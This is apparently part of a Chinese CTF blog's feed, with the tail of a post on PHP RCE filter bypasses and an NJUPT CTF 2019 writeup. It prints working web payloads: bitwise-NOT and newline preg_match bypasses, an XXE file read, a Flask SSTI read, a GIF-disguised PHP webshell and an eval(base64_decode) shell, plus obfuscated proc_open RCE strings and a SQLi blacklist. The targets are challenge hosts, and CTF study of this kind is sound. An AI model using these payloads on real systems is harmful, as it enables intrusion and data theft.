&#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‰ç½®çŸ¥è¯†-1"><a href="#å‰ç½®çŸ¥è¯†-1" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>php7.0.æ”¯æŒä»¥ä¸‹æ ¼å¼æ‰§è¡Œå‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($a)();</span><br></pre></td></tr></table></figure><p><code>~</code>å–åè¿ç®—ç¬¦ï¼Œå¯ä»¥å°†å­—ç¬¦ä¸²å–åï¼Œä¸¤æ¬¡å–åå³å¯ç”¨äºæ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">'system'</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"?&gt;&lt;?=`ls`?&gt;"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h3><p>å…ˆå°†è¢«è¿‡æ»¤çš„å­—ç¬¦å–åå¹¶ç¼–ç ï¼Œå†åœ¨è¾“å…¥å¤„å–åè¿˜åŸå³å¯ã€‚</p><h3 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/ctf/no_char_and_num_rce/index.php?code="</span></span><br><span class="line">payload = <span class="string">"(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);"</span>  <span class="comment"># system('cat /flag');</span></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2"></a>æ€è·¯2</h3><p>å¦‚æœphpç‰ˆæœ¬ä¸æ˜¯7.0çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘ä½¿ç”¨é€šé…ç¬¦è¯»å–æ–‡ä»¶ã€‚</p><h3 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><p>è¿™é‡Œé€šé…ç¬¦åŒ¹é…æœ‰ç‚¹ç„å­¦ï¼Œæˆ‘å¤ç°æ²¡æœ‰æˆåŠŸï¼Œè´´ä¸€ä¸ªpayloadå§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=`/???/??? ????.???`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡preg-match"><a href="#ç»•è¿‡preg-match" class="headerlink" title="ç»•è¿‡preg_match()"></a>ç»•è¿‡preg_match()</h2><p>é¢˜ç›®ï¼š<strong>[FBCTF2019]RCEService</strong></p><p>è€ƒå¯Ÿç‚¹ï¼š<code>preg_match()</code>åªå¯¹ç¬¬ä¸€è¡Œè¿›è¡ŒåŒ¹é…ï¼Œå½“æˆ‘ä»¬åœ¨è¾“å…¥ç‚¹ä¸¤ç«¯è¾“å…¥å›è½¦ç¬¦<code>%0a</code>æ—¶ï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤ï¼Œå½“ç„¶è¿™é‡Œçš„å‰ææ˜¯æ²¡æœ‰å¯¹ä¸¤ç«¯è¿‡æ»¤ã€‚</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%<span class="number">0</span>a<span class="string">"cmd"</span>:<span class="string">"/bin/cat /home/rceservice/flag"</span>%<span class="number">0</span>a&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ…¢æ…¢èµ°å‡ºæ¥äº†ï¼Œæ¯•ç«Ÿä¸–ç•Œä¸Šè¿˜æœ‰é‚£ä¹ˆå¤šç¾å¥½çš„ä¸œè¥¿ã€‚</p><p>å’Œä½ ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™é‡Œç”¨æ¥è®°å½•ä¸€ä¸‹è‡ªå·±åšé¢˜è¿‡ç¨‹ä¸­é‡åˆ°æœ‰è¶£çš„RCEï½&lt;/p&gt;
&lt;h2 id=&quot;5ä¸ªå­—ç¬¦getshell&quot;&gt;&lt;a href=&quot;#5ä¸ªå­—ç¬¦getsh
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>NJUPT CTF writeup</title>
    <link href="https://www.sketchplane.top/2019/11/22/NJCTF_WP/"/>
    <id>https://www.sketchplane.top/2019/11/22/NJCTF_WP/</id>
    <published>2019-11-22T13:25:11.000Z</published>
    <updated>2019-11-25T16:04:32.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‰“æ‰“å°æ¯”èµ›ç»ƒç»ƒæ‰‹~</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;W3lc0m3_T0_NCTF_9102&#125;</span><br></pre></td></tr></table></figure><h4 id="True-XML-cookbookï¼ˆæœªè§£å‡ºï¼‰"><a href="#True-XML-cookbookï¼ˆæœªè§£å‡ºï¼‰" class="headerlink" title="True XML cookbookï¼ˆæœªè§£å‡ºï¼‰"></a>True XML cookbookï¼ˆæœªè§£å‡ºï¼‰</h4><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/f'</span>+<span class="string">'lag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>é¢ï¼Œç®—æ˜¯éå¸¸ç®€å•çš„SSTIäº†ï¼Œå¯ä»¥çœ‹æˆ‘åšå®¢ï¼šsketchplane.top</p><h4 id="upload-your-shell"><a href="#upload-your-shell" class="headerlink" title="upload your shell"></a>upload your shell</h4><p>1ï¼Œ ç›´æ¥ä¸Šä¼ ä¸€ä¸ªv01cano.jpgæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[1]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>2ï¼Œ å¾—åˆ°è¿”å›æ–‡ä»¶åœ°å€ï¼š</p><p>filepath:/var/www/html/upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg</p><p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VzCG.png" alt="img"></p><p>3ï¼Œ ç›´æ¥åˆ©ç”¨æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè¯»å–Th1s_is_a_fl4g.jpgæ–‡ä»¶çš„å†…å®¹ï¼š</p><p><a href="http://nctf2019.x1ct34m.com:60002/index.php?action=upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg" target="_blank" rel="noopener">http://nctf2019.x1ct34m.com:60002/index.php?action=upload-imgs/11d27c0cfce57aa050a1815412e1bb81/Th1s_is_a_fl4g.jpg</a></p><p>å¾—åˆ°flagå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;upload_1s_s0_funn7&#125;</span><br></pre></td></tr></table></figure><h4 id="simple-xss"><a href="#simple-xss" class="headerlink" title="simple_xss"></a>simple_xss</h4><p>ç›´æ¥åœ¨å†…å®¹æ¡†ä¸­æ’å…¥ä¸€æ®µæ‰“cookieçš„jsä»£ç ï¼ŒæˆåŠŸè·å–cookie:</p><p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VEsj.png" alt=""></p><p>æ›¿æ¢cookieè·å–flagï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/11/25/k6VYIc.png" alt=""></p><h4 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h4><p>â€œ/robots.txtâ€-&gt;â€œ/hint.txtâ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>ä¸å¤šè¯´åºŸè¯ç›´æ¥ä¸Šå›¾</p><p><img src="https://t1.picb.cc/uploads/2019/11/24/k6ynjM.png" alt=""></p><p><img src="https://t1.picb.cc/uploads/2019/11/24/k6yeYt.png" alt=""></p><p>è„šæœ¬ä¼šæ£€æµ‹åˆ°%00ï¼Œæ‰‹å·¥Fuzzï¼Œwsl</p><h4 id="phar-matches-everything-æœªè§£å‡º"><a href="#phar-matches-everything-æœªè§£å‡º" class="headerlink" title="phar matches everything (æœªè§£å‡º)"></a>phar matches everything (æœªè§£å‡º)</h4><p>Warning: getimagesize(<a href="http://nctf2019.x1ct34m.com:40004/upload.php%00.jpg" target="_blank" rel="noopener">http://nctf2019.x1ct34m.com:40004/upload.php%00.jpg</a>): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /var/www/html/catchmime.php on line 28<br>File is not an image.</p><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://www.secpulse.com/archives/94680.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/94680.html</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11504051.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11504051.html</a><br><a href="https://blog.csdn.net/xiaorouji/article/details/83118619" target="_blank" rel="noopener">https://blog.csdn.net/xiaorouji/article/details/83118619</a></p><h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a</span><br><span class="line">&amp;str1=<span class="number">240610708</span></span><br><span class="line">&amp;str2=QPPQKSY</span><br><span class="line">&amp;q.w.q=ca\t *</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å­¦åˆ°ä¸å°‘2333</p><h5 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h5><p>åˆ©ç”¨preg_match()ä¸åŒ¹é…æ¢è¡Œç¬¦ (åº”è¯¥æ˜¯ï¼Œæœ‰æ—¶å€™æ„Ÿè§‰è¿™ç§ä¸œè¥¿ä¸å¥½è¯´= =</p><h5 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h5><p>strtr()æ˜¯æŒ‰å•ä¸ªå­—ç¬¦åŒ¹é…æ›¿æ¢çš„ã€‚ã€‚ã€‚</p><h5 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h5><p>$_GET[â€˜c_m_dâ€™] ï¼Œä¼ å‚æ—¶ c_m_d ç­‰ä»·äº c.m.d</p><p>cat * ç›´æ¥getflag</p><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>pat=xxx&amp;sub=xxx&amp;rep=%40eval(%40base64_decode(%24_POST%5Bn0ee1cca39220e%5D))%3B&amp;n0ee1cca39220e=c3lzdGVtKCJjYXQgL2ZsYWciKTs=</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;getshe11_has_different_methods&#125;</span><br></pre></td></tr></table></figure><h4 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h4><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code=$p = proc_.open;</span><br><span class="line">$p1 = p.i.pe;</span><br><span class="line">$s = stre.am_.ge.t_con.te.nts;</span><br><span class="line">$arr =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="number">0</span> = <span class="keyword">array</span>($p1,r),</span><br><span class="line"> <span class="number">1</span> = <span class="keyword">array</span>($p1,w),</span><br><span class="line"> <span class="number">2</span> = <span class="keyword">array</span>(fi.le,tmperror.l.og, a)</span><br><span class="line"> );    </span><br><span class="line">$cwd = ;</span><br><span class="line">$env = <span class="keyword">array</span>();</span><br><span class="line">$process = $p(readflag, $arr, $p1, $cwd,$env);<span class="keyword">echo</span> $s($p1[<span class="number">1</span>]);</span><br><span class="line">&amp;useful=etcpasswd</span><br></pre></td></tr></table></figure><p>search directory:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$a=$p=<span class="string">"/readflag"</span>;$d=<span class="string">"d"</span>.<span class="string">"i"</span>.<span class="string">"r"</span>;$o=$d($p);$r=<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"a"</span>.<span class="string">"d"</span>;<span class="keyword">while</span> (<span class="keyword">false</span> !== ($entry = $o-&gt;$r())) &#123;</span><br><span class="line">   <span class="keyword">echo</span> $entry.<span class="string">"\n"</span>;</span><br><span class="line">&#125;&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure><p>readfile:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=$v=<span class="string">"var_"</span>.<span class="string">"dump"</span>;$f=<span class="string">"fil"</span>.<span class="string">"e"</span>;$v($f(<span class="string">"/readflag"</span>));</span><br><span class="line">&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure><p>RCE:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?code=$p = <span class="string">"proc_"</span>.<span class="string">"open"</span>;</span><br><span class="line">$p1 = <span class="string">"p"</span>.<span class="string">"i"</span>.<span class="string">"pe"</span>;</span><br><span class="line">$s = <span class="string">"stre"</span>.<span class="string">"am_"</span>.<span class="string">"ge"</span>.<span class="string">"t_con"</span>.<span class="string">"te"</span>.<span class="string">"nts"</span>;</span><br><span class="line">$arr =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="number">0</span> =&gt; <span class="keyword">array</span>($p1,<span class="string">"r"</span>),</span><br><span class="line"> <span class="number">1</span> =&gt; <span class="keyword">array</span>($p1,<span class="string">"w"</span>),</span><br><span class="line"> <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"fi"</span>.<span class="string">"le"</span>,<span class="string">"/tmp/error.l"</span>.<span class="string">"og"</span>, <span class="string">"a"</span>)</span><br><span class="line"> );    </span><br><span class="line">$cwd = <span class="string">"/"</span>;</span><br><span class="line">$env = <span class="keyword">array</span>();</span><br><span class="line">$process = $p(<span class="string">"/readflag"</span>, $arr, $p1, $cwd,$env);<span class="keyword">echo</span> $s($p1[<span class="number">1</span>]);</span><br><span class="line">&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure><p>æˆ‘çš„å¿ƒè·¯å†ç¨‹éƒ½åœ¨è¿™äº†ã€‚ã€‚ã€‚</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;just_debug_it_2333&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_42621117/article/details/99768988" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42621117/article/details/99768988</a></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'139.129.76.65'</span>, <span class="number">50003</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;hell0__play&#125;</span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h4><p>å›¾ç‰‡å°¾éƒ¨é™„åŠ äº†å‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°æç¤ºå’Œä¸¤ä¸ªå›¾ç‰‡ï¼Œæç¤ºæ¯”è¾ƒä¸¤å›¾ç‰‡åƒç´ ï¼Œä½¿ç”¨Stegsolve â€œto_do.pngâ€-â€œto.pngâ€=flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;m1sc_1s_very_funny!!!&#125;</span><br></pre></td></tr></table></figure><h4 id="Become-a-Rockstar"><a href="#Become-a-Rockstar" class="headerlink" title="Become a Rockstar"></a>Become a Rockstar</h4><p>æ‰€æœ‰â€œsaysâ€åé¢çš„ä¸œè¥¿æ‹¼ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;youarnicerockstar&#125;</span><br></pre></td></tr></table></figure><h4 id="Bright-Body-I"><a href="#Bright-Body-I" class="headerlink" title="Bright Body I"></a>Bright Body I</h4><p>\Bright Body I\Magic\Content\Paks\Magic-WindowsNoEditor.pakæ–‡ä»¶ä¸­ç›´æ¥æœâ€œNCTFâ€å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;R_U_4_D4rk5Ou1s_III_P14y3r&#125;</span><br></pre></td></tr></table></figure><h4 id="æœ‰å†…é¬¼-ç»ˆæ­¢äº¤æ˜“"><a href="#æœ‰å†…é¬¼-ç»ˆæ­¢äº¤æ˜“" class="headerlink" title="æœ‰å†…é¬¼,ç»ˆæ­¢äº¤æ˜“"></a>æœ‰å†…é¬¼,ç»ˆæ­¢äº¤æ˜“</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.json</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"123.207.121.32"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">25565</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"5e77b05530b30283e24c120d8cc13fb5"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">600</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shadowsocksæµé‡åŒ…è§£å¯†</p><h4 id="é”®ç›˜ä¾ "><a href="#é”®ç›˜ä¾ " class="headerlink" title="é”®ç›˜ä¾ "></a>é”®ç›˜ä¾ </h4><p>ä¼ªåŠ å¯†è§£å‹å¾—åˆ°å›¾ç‰‡ï¼Œå°¾éƒ¨é™„åŠ docæ–‡æ¡£ï¼Œæ–‡ä»¶-é€‰é¡¹-æ˜¾ç¤ºéšè—æ–‡å­—ï¼Œé€‰ä¸­æ–‡å­—-å­—ä½“-å–æ¶ˆéšè—-å¤åˆ¶-base85è§£å¯†å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŸæ–‡</span></span><br><span class="line">PD4~idqQC|WjHloX&gt;)UPb8~ZFb8laGczAeteE</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">NCTF&#123;Ba3e85_issssss_so_xxxxx&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/Yuuki-/p/7897069.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yuuki-/p/7897069.html</a></p><h4 id="Whatâ€™s-this"><a href="#Whatâ€™s-this" class="headerlink" title="Whatâ€™s this"></a>Whatâ€™s this</h4><p>å¯¼å‡ºå‹ç¼©åŒ…ï¼Œä¼ªåŠ å¯†è§£å¯†å¾—åˆ°æ–‡æœ¬æ–‡ä»¶ï¼Œbase64éšå†™è§£å¯†ï¼ŒäºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;dbb2ef54afc2877ed9973780606a3c8b&#125;</span><br></pre></td></tr></table></figure><h4 id="2077"><a href="#2077" class="headerlink" title="2077"></a>2077</h4><p>i:0-2986<br><a href="https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/360p30/i.ts" target="_blank" rel="noopener">https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/360p30/i.ts</a><br><a href="https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/chunked/i.ts" target="_blank" rel="noopener">https://vod-secure.twitch.tv/0b27f6f98c0cbb6c6c1e_cdprojektred_30100213392_949888768/chunked/i.ts</a></p><p>wget -i dl.csv</p><p>ffmpeg -f concat -i filelist.txt -c copy output.mp4</p><p>ffmpeg -i output.mp4 -r 0.018 image-%05d.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PSC:\&gt;.&#x2F;drop_package</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAB4AAAAQ4CAIAAABnSVYUAAjxYk1EQVR4AYzYBXPbyrcA8JQS</span><br><span 